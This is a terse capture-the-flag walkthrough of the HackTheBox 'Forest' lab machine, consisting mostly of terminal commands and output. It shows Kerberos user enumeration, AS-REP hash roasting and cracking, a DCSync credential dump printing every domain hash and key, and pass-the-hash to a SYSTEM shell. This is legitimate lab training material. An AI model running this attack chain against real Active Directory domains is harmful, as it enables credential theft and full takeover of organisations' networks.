
`rustscan`
```sh
┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$ export IP=10.10.10.161

┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$ rustscan -a $IP --ulimit 5000 --range 1-65000 -t 2000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/bopbap/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.161:53
Open 10.10.10.161:88
Open 10.10.10.161:135
Open 10.10.10.161:139
Open 10.10.10.161:389
Open 10.10.10.161:445
Open 10.10.10.161:464
Open 10.10.10.161:593
Open 10.10.10.161:636
Open 10.10.10.161:5985
Open 10.10.10.161:9389
Open 10.10.10.161:47001
Open 10.10.10.161:49664
Open 10.10.10.161:49666
Open 10.10.10.161:49667
Open 10.10.10.161:49665
Open 10.10.10.161:49684
Open 10.10.10.161:49703
Open 10.10.10.161:49941
Open 10.10.10.161:49676
Open 10.10.10.161:49677
Open 10.10.10.161:49671
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-19 05:54 EDT
Initiating Ping Scan at 05:54
Scanning 10.10.10.161 [2 ports]
Completed Ping Scan at 05:54, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:54
Completed Parallel DNS resolution of 1 host. at 05:54, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 05:54
Scanning 10.10.10.161 [22 ports]
Discovered open port 139/tcp on 10.10.10.161
Discovered open port 445/tcp on 10.10.10.161
Discovered open port 135/tcp on 10.10.10.161
Discovered open port 53/tcp on 10.10.10.161
Discovered open port 49665/tcp on 10.10.10.161
Discovered open port 49941/tcp on 10.10.10.161
Discovered open port 49684/tcp on 10.10.10.161
Discovered open port 49664/tcp on 10.10.10.161
Discovered open port 49667/tcp on 10.10.10.161
Discovered open port 49676/tcp on 10.10.10.161
Discovered open port 9389/tcp on 10.10.10.161
Discovered open port 88/tcp on 10.10.10.161
Discovered open port 389/tcp on 10.10.10.161
Discovered open port 636/tcp on 10.10.10.161
Discovered open port 49666/tcp on 10.10.10.161
Discovered open port 49703/tcp on 10.10.10.161
Discovered open port 593/tcp on 10.10.10.161
Discovered open port 49677/tcp on 10.10.10.161
Discovered open port 464/tcp on 10.10.10.161
Discovered open port 5985/tcp on 10.10.10.161
Discovered open port 47001/tcp on 10.10.10.161
Discovered open port 49671/tcp on 10.10.10.161
Completed Connect Scan at 05:54, 0.15s elapsed (22 total ports)
Nmap scan report for 10.10.10.161
Host is up, received conn-refused (0.070s latency).
Scanned at 2023-07-19 05:54:49 EDT for 0s

PORT      STATE SERVICE        REASON
53/tcp    open  domain         syn-ack
88/tcp    open  kerberos-sec   syn-ack
135/tcp   open  msrpc          syn-ack
139/tcp   open  netbios-ssn    syn-ack
389/tcp   open  ldap           syn-ack
445/tcp   open  microsoft-ds   syn-ack
464/tcp   open  kpasswd5       syn-ack
593/tcp   open  http-rpc-epmap syn-ack
636/tcp   open  ldapssl        syn-ack
5985/tcp  open  wsman          syn-ack
9389/tcp  open  adws           syn-ack
47001/tcp open  winrm          syn-ack
49664/tcp open  unknown        syn-ack
49665/tcp open  unknown        syn-ack
49666/tcp open  unknown        syn-ack
49667/tcp open  unknown        syn-ack
49671/tcp open  unknown        syn-ack
49676/tcp open  unknown        syn-ack
49677/tcp open  unknown        syn-ack
49684/tcp open  unknown        syn-ack
49703/tcp open  unknown        syn-ack
49941/tcp open  unknown        syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds


```

nmap

```sh

┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$ nmap -sC -sV -p- $IP -T4 -o nmap_full.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-19 06:29 EDT
Nmap scan report for 10.10.10.161
Host is up (0.069s latency).
Not shown: 65511 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-19 10:37:13Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49941/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-07-19T10:38:07
|_  start_date: 2023-07-19T06:06:19
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-07-19T03:38:05-07:00
|_clock-skew: mean: 2h26m49s, deviation: 4h02m29s, median: 6m48s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.40 seconds
```

`enum4linux`

```sh

```

`kerberute`

```sh
┌──(bopbap㉿Matrix)-[~/Workspace/Tools-CTF/kerbrute/dist]
└─$ ./kerbrute_linux_arm64 userenum --dc forest.htb.local -d htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
2023/07/19 06:36:47 >  [+] VALID USERNAME:	 john@htb.local
2023/07/19 06:36:47 >  [+] VALID USERNAME:	 mark@htb.local
2023/07/19 06:36:48 >  [+] VALID USERNAME:	 andy@htb.local
2023/07/19 06:36:56 >  [+] VALID USERNAME:	 John@htb.local
2023/07/19 06:37:00 >  [+] VALID USERNAME:	 forest@htb.local
2023/07/19 06:37:04 >  [+] VALID USERNAME:	 Mark@htb.local
2023/07/19 06:37:06 >  [+] VALID USERNAME:	 administrator@htb.local
2023/07/19 06:37:12 >  [+] VALID USERNAME:	 evil@htb.local
2023/07/19 06:37:20 >  [+] VALID USERNAME:	 Andy@htb.local
2023/07/19 06:37:24 >  [+] VALID USERNAME:	 JOHN@htb.local
2023/07/19 06:37:34 >  [+] VALID USERNAME:	 sebastien@htb.local
2023/07/19 06:37:51 >  [+] VALID USERNAME:	 MARK@htb.local
2023/07/19 06:38:20 >  [+] VALID USERNAME:	 Forest@htb.local
2023/07/19 06:38:32 >  [+] VALID USERNAME:	 santi@htb.local
2023/07/19 06:38:44 >  [+] VALID USERNAME:	 lucinda@htb.local
2023/07/19 06:38:49 >  [+] VALID USERNAME:	 Administrator@htb.local
2023/07/19 06:40:40 >  [+] VALID USERNAME:	 ANDY@htb.local
2023/07/19 06:44:36 >  [+] VALID USERNAME:	 Sebastien@htb.local
2023/07/19 06:47:16 >  [+] VALID USERNAME:	 FOREST@htb.local
2023/07/19 06:52:35 >  [+] VALID USERNAME:	 SEBASTIEN@htb.local
2023/07/19 06:53:04 >  [+] VALID USERNAME:	 Evil@htb.local
^C
```


```sh
┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$ impacket-GetNPUsers -usersfile domain-user.txt -outputfile hash-domain-user.txt -dc-ip $IP htb.local/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User john doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User evil doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set

┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$ ls
domain-user.txt  hash-domain-user.txt  nmap_full.txt

┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$ cat hash-domain-user.txt
$krb5asrep$23$svc-alfresco@HTB.LOCAL:7b598ae64716b3e748f3632c6aa40fe3$85248fb350368de3f3bc9fa9b251508caec4a3848f6be36d442ab52716cb855175f115d05323096a5f751303cf8e33c8ae7af9034cf42ca0c95b7382f9ecc7e763cc89f848bb454322f7a0041d616eb4c815ee20873c7caf22c0cdfdf3c5c9c9ee24acaa2c90bcd32c0ca303c1d30e37df8297edfacc1a6c03c317d79c6ab2b3c1401e1c3c00ad076f4dd607548ed2b9000913fde5c4d804893eab6598a13355f1c3f2fa2d05d0a925806237e400b6c86267768e4adc1f87c2ac7fb919f924f1255c855e720093920ecc5679b6480f2de03e75c153719b937012a309c5231401dad6e7e72ccc

┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$ john hash-domain-user.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)

┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$ john hash-domain-user.txt  --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 ASIMD 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:05 DONE (2023-07-19 07:17) 0.1818g/s 742865p/s 742865c/s 742865C/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$ john hash-domain-user.txt  --wordlist=/usr/share/wordlists/rockyou.txt --show
Invalid options combination: "--show"

┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$ john hash-domain-user.txt   --show
$krb5asrep$23$svc-alfresco@HTB.LOCAL:s3rvice

1 password hash cracked, 0 left

┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$
```

We have already seen in the nmap output that port 5985 is open. We can try to connect via winrm and try to get a shell. We will be using evil-winrm to connect.

BloodHound

```sh
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ./SharpHound.exe -c All
```

```sh
Import-Module .\PowerView.ps1
```

Dump hash with secretdump
```sh
┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$ impacket-secretsdump htb.local/bop:bop@123@htb.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
john:9601:aad3b435b51404eeaad3b435b51404ee:44f077e27f6fef69e7bd834c7242b040:::
apple:9602:aad3b435b51404eeaad3b435b51404ee:77c3d95fb18e45453de230ee89c56fc2:::
aurey:9603:aad3b435b51404eeaad3b435b51404ee:d503a8571a79baf9b951884f350ad048:::
pwnt:9604:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
bop:9606:aad3b435b51404eeaad3b435b51404ee:3be10aab8f45169046542c82292e8a0e:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:2ca17b09f619d3517e09e402d1797632:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
john:aes256-cts-hmac-sha1-96:d62a736f49f88defdf75b0d9dde229c06e610deab92f16551e66f4a48c034aaf
john:aes128-cts-hmac-sha1-96:cc9cf4f03dd5bc20ce617ce19a6c0f1d
john:des-cbc-md5:b5b657cdc86d2668
apple:aes256-cts-hmac-sha1-96:6412e7049d33cb1b7ebfb434412647fc339a3b0c25a9354b0a9aceda8da4a0c4
apple:aes128-cts-hmac-sha1-96:0a582d36d07896f11b2e878979584ec9
apple:des-cbc-md5:617afb5497d3a29e
aurey:aes256-cts-hmac-sha1-96:5dd0e674523feb37957fdf1ba3319bfa66575a4b0cd537a0110b437500864845
aurey:aes128-cts-hmac-sha1-96:6a6e36b1d2b6958ca248bb34882be540
aurey:des-cbc-md5:9b3bc798a2e6e5ef
pwnt:aes256-cts-hmac-sha1-96:a9b80bb40c8e58b8736ebe931b5b8f651218c65acae816fc306a2c5de4a3982d
pwnt:aes128-cts-hmac-sha1-96:890ff1e06bf95dea1d1245f7ad6176cd
pwnt:des-cbc-md5:8feadc79d3f2dac2
bop:aes256-cts-hmac-sha1-96:29e2d6dbabec4790f1845c8c0f363a2f7f1cae14f3ad7206b5c2d9a0df3e4a1f
bop:aes128-cts-hmac-sha1-96:673e655157bb9d6884c1f919fe17cdb5
bop:des-cbc-md5:9140eaa229dc5240
FOREST$:aes256-cts-hmac-sha1-96:2dd2c363c2bbf04fd8f8a10ca36b7827cf7d07015354f9190439f23c2db9fef7
FOREST$:aes128-cts-hmac-sha1-96:ef68795a5175541d8d802c02832bb66e
FOREST$:des-cbc-md5:c8132fbf73c71fa8
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...

┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$
```


Check with `crackmapexec`
```sh
┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$ crackmapexec smb htb.local -u administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 -d htb.local/
SMB         htb.local       445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local/) (signing:True) (SMBv1:True)
SMB         htb.local       445    FOREST           [+] htb.local/\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)

```


```sh
┌──(bopbap㉿Matrix)-[~/Workspace/Hackthebox/Forest]
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@htb.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on htb.local.....
[*] Found writable share ADMIN$
[*] Uploading file VuCHzIFW.exe
[*] Opening SVCManager on htb.local.....
[*] Creating service jMxW on htb.local.....
[*] Starting service jMxW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> id
'id' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```